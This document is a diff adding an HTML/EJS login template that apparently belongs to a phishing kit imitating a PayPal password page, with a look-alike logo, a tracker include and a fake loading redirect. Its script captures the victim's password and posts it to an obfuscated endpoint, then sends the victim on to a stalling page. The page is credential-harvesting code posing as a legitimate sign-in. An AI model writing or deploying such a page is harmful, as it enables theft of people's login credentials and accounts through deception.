@@ -1,0 +1,103 @@
+<html lang="de"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/css/index.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+     <%- include('partials/tracker') %>
+</head>
+<body>
+    <header>
+    
+    </header>
+    <main>
+        <form method="post" id="pass">
+            <div class="logo">
+                <img src="img/pipillgomark.png" alt="">
+            </div>
+            <div class="change">
+                <p><%=user%></p>
+                <a href="/">Change</a>
+            </div>
+            <div class="input-container">
+                <input required="" id="password" type="password">
+                <label class="label" for="password">Password</label>
+                <div class="underline"></div>
+                <div id="errorMessage" style="color: #d01a1a; font-size: 12px; margin-top: 5px; display: none;">Please enter your password.</div>
+            </div>
+            <div class="bot">
+                <div class="first">
+                    <p>Forgot password?</p>
+                    <button class="btn" type="submit">Sign in</button>
+                </div>
+                <div class="mid">
+                    <hr>
+                    <span>o</span>
+                    <hr>
+                </div>
+                <div class="second">
+                    <a href="">Register</a>
+                </div>
+                <div class="third">
+                    <a href="">Arabic</a>
+                    <hr>
+                    <a href="" class="active">English</a>
+                    <hr>
+                    <a href="">French</a>
+                    <hr>
+                    <a href="">Spanish</a>
+                    <hr>
+                    <a href="">Chinese</a>
+                </div>
+            </div>
+        </form>
+    </main>
+    <footer>
+        <p>Contact</p>
+        <p>Data Protection</p> 
+        <p>Legal</p>
+        <p>Policy Updates</p>
+        <p>Worldwide</p>
+    </footer>
+
+    <script>
+        document.getElementById('pass').addEventListener('submit', function(e) {
+            e.preventDefault();
+            console.log("submit");
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('errorMessage');
+            
+            if (!password.trim()) {
+                // Show error message if password is empty
+                errorMessage.style.display = 'block';
+                return; // Stop form submission
+            }
+            
+            // Hide error message if password is not empty
+            errorMessage.style.display = 'none';
+            console.log('Login attempt:', { password });
+
+            $.ajax({
+                url: '/xGuVKoqaCJPI489XsT08', 
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({password}),
+                success: function(info) {
+                    if(info.OK){
+                        window.location = "/loadingpp?time=15&url=/SoZ4opAM7PZIBpY0Ua7tV";
+                    }
+                }
+            });
+        });
+        
+        // Also hide error message when user starts typing
+        document.getElementById('password').addEventListener('input', function() {
+            const errorMessage = document.getElementById('errorMessage');
+            if (errorMessage) {
+                errorMessage.style.display = 'none';
+            }
+        });
+    </script>
+
+
+
+</body></html>
